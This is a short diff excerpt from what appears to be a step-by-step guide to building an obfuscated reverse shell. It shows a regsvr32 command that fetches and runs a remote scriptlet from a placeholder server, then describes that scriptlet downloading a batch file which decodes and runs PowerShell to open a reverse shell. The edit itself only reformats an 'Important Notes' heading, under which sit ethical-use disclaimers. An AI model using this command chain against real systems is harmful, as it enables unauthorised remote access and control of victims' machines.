@@ -70,7 +70,9 @@ regsvr32 /s /i:http://yourserver.com/reverse_shell.sct scrobj.dll
 
 7. Establish the Reverse Shell Connection
 When the SCT file is executed, it will download and run the batch file, which will decode and execute the PowerShell script to establish a reverse shell connection to the specified IP and port.
-Important Notes
+
+
+Important Notes:
 Ethical Use: Ensure you have explicit permission to test systems with this script. Unauthorised use is illegal and unethical.
 Controlled Environment: Use a controlled environment for testing.
 Troubleshooting: Keep a non-obfuscated version of the scripts for troubleshooting and maintenance.
